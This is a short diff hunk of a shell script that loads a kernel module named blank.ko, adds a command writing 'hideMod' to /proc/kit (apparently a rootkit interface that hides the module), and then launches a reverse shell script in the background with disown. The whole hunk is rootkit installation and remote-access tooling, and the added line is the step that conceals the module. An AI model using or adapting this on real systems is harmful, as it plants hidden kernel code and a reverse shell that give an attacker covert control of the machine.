@@ -7,6 +7,7 @@ ls | egrep -v "(\.ko|\.sh|fromBash|toBash)"  && exit #TODO: print a message e.g.
 
 
 sudo insmod blank.ko &&
+echo "hideMod" > /proc/kit &&
 ./reverseShell.sh & disown
 
 
